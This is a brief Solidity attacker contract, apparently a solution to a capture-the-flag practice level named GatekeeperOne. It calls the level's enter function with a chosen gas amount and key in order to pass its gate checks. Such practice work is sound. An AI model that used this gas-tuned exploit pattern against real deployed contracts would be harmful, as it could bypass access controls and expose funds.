// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {GatekeeperOne} from './Level.sol';

contract Attacker {

    GatekeeperOne target;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    function attack(uint256 _gas, bytes8 _key) external {
        address(target).call{gas: _gas}(abi.encodeWithSelector(target.enter.selector, _key));
    }

}